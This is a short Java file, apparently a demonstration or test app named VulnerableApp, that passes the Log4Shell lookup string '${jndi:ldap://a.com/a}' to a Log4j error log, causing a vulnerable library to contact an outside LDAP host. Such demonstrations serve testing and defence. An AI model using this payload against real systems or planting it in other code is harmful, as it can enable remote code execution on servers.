package com.mycompany.app;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class VulnerableApp {

    private static final Logger logger = LogManager.getLogger(VulnerableApp.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://a.com/a}");
    }
}
